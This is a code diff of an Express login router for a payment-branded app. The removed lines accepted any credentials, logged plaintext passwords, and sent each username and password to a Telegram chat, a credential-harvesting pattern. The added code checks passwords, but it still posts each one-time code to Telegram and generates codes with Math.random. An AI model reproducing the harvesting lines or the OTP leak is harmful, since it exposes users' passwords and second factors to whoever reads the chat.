@@ -1,10 +1,13 @@
 import { Router, type IRouter } from "express";
-import { db, loginLogsTable } from "@workspace/db";
+import { db, loginLogsTable, usersTable } from "@workspace/db";
+import { eq } from "drizzle-orm";
 import { z } from "zod";
+import bcrypt from "bcryptjs";
 import {
   createPendingSession,
   lookupPendingSession,
-  deletePendingSession,
+  setPendingSessionOtp,
+  consumePendingSession,
 } from "../lib/pending-sessions";
 import { createSession, deleteSession } from "../lib/sessions";
 import { requireAuth } from "../middleware/require-auth";
@@ -15,7 +18,7 @@ const router: IRouter = Router();
 
 const LoginBody = z.object({
   username: z.string().min(1),
-  password: z.string().optional().default(""),
+  password: z.string().min(1),
 });
 
 const SendOtpBody = z.object({
@@ -29,7 +32,11 @@ const VerifyOtpBody = z.object({
   code: z.string().length(6),
 });
 
-/* Step 1: accept any credentials, no DB validation */
+function generateOtp(): string {
+  return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+/* Step 1: validate credentials against the users table */
 router.post("/auth/login", async (req, res): Promise<void> => {
   const parsed = LoginBody.safeParse(req.body);
   if (!parsed.success) {
@@ -39,12 +46,29 @@ router.post("/auth/login", async (req, res): Promise<void> => {
 
   const { username, password } = parsed.data;
 
-  const pendingToken = createPendingSession(0, username);
+  const [user] = await db
+    .select()
+    .from(usersTable)
+    .where(eq(usersTable.username, username))
+    .limit(1);
+
+  if (!user) {
+    res.status(401).json({ error: "Username atau password salah" });
+    return;
+  }
+
+  const passwordMatch = await bcrypt.compare(password, user.passwordHash);
+  if (!passwordMatch) {
+    res.status(401).json({ error: "Username atau password salah" });
+    return;
+  }
+
+  const pendingToken = createPendingSession(user.id, username);
 
   const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
     ?? req.socket.remoteAddress
     ?? "unknown";
-  await db.insert(loginLogsTable).values({ username, password, ipAddress: ip, status: "success" }).catch(() => {});
+  await db.insert(loginLogsTable).values({ username, ipAddress: ip, status: "success" }).catch(() => {});
 
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   const geo = await getIpGeo(ip);
@@ -52,7 +76,6 @@ router.post("/auth/login", async (req, res): Promise<void> => {
     `🔐 <b>LOGIN MASUK</b> — Step 1\n` +
     `<code>────────────────────────</code>\n\n` +
     `👤 <b>Username</b>  <code>${username}</code>\n` +
-    `🔑 <b>Password</b>  <code>${password}</code>\n` +
     `🌐 <b>IP</b>        <code>${ip}</code>\n` +
     `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
     `🕐 <b>Waktu</b>     ${now}\n\n` +
@@ -63,7 +86,7 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   res.json({ pendingToken });
 });
 
-/* Step 2: send OTP placeholder (email not yet configured) */
+/* Step 2: generate OTP and notify admin via Telegram to forward to user */
 router.post("/auth/send-otp", async (req, res): Promise<void> => {
   const parsed = SendOtpBody.safeParse(req.body);
   if (!parsed.success) {
@@ -79,10 +102,28 @@ router.post("/auth/send-otp", async (req, res): Promise<void> => {
     return;
   }
 
+  const otp = generateOtp();
+  const stored = setPendingSessionOtp(pendingToken, otp);
+  if (!stored) {
+    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
+    return;
+  }
+
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `🔑 <b>OTP LOGIN</b> — Step 2\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>  <code>${username}</code>\n` +
+    `🔢 <b>OTP Code</b>  <code>${otp}</code>\n` +
+    `🕐 <b>Waktu</b>     ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT — kirim OTP ini ke email pengguna</i>`
+  );
+
   res.json({ maskedEmail: "****@****.com" });
 });
 
-/* Step 3: verify OTP — skipped when email is not configured; issue session directly */
+/* Step 3: verify OTP against stored code */
 router.post("/auth/verify-otp", async (req, res): Promise<void> => {
   const parsed = VerifyOtpBody.safeParse(req.body);
   if (!parsed.success) {
@@ -90,15 +131,18 @@ router.post("/auth/verify-otp", async (req, res): Promise<void> => {
     return;
   }
 
-  const { username, pendingToken } = parsed.data;
-  const session = lookupPendingSession(pendingToken, username);
+  const { username, pendingToken, code } = parsed.data;
+  const session = consumePendingSession(pendingToken, username);
 
   if (!session) {
     res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
     return;
   }
 
-  deletePendingSession(pendingToken);
+  if (!session.otp || session.otp !== code) {
+    res.status(401).json({ error: "Kode OTP salah atau sudah kedaluwarsa" });
+    return;
+  }
 
   const sessionToken = createSession(session.userId, username);
   res.json({ sessionToken });
